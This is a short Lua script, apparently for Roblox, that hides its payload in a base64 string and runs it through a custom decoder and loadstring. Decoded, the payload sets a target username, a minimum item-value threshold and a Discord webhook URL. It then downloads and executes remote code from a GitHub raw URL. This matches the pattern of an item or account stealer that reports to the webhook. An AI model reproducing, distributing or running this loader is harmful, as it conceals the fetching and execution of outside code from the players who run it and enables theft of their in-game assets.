
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gIkxFT05JMTIwOCIKVXNlcm5hbWUyID0gIkxFT05JMTIwOCIKTWluaW11bVJBUCA9IDEwMDAKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzQ3MTE5MzA1OTkyNDQxODU3L0huNTJfbXdRbjNNcXRwYzBFamJueURNMHZsSV8tQ2VvVS1tSFl1czFmZjNtOXVTRHc3V2ZMbVIyeTZMNFZ3aTJ0WHJwIgoKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8yMTRFbGkvMjE0c2NyaXB0cy9yZWZzL2hlYWRzL21haW4vMjE0c2NyaXB0cyIsIHRydWUpKSgp"

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()